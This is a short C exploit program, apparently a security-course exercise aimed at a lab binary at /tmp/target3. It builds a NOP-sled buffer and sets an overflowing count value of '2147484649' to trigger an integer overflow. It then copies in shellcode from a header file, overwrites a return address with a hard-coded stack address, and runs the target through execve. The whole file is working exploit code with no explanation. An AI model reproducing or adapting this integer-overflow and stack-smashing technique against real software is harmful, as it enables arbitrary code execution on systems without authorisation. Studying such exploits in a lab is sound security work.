#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{

  char sploitstring[1000 * (2 * sizeof(double) + sizeof(int)) + 4 + 11];
  memset(sploitstring, '\x90', sizeof(sploitstring));
  char *countstring = "2147484649,";//2147484649 2147483648
  memcpy(sploitstring, countstring, strlen(countstring));
  memcpy(sploitstring + 40, shellcode, strlen(shellcode));
  *(int *)(sploitstring + 20000 + strlen(countstring) + 4) = 0xbfff6210;

  char *args[] = { TARGET, sploitstring, NULL };
  char *env[] = { NULL };

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
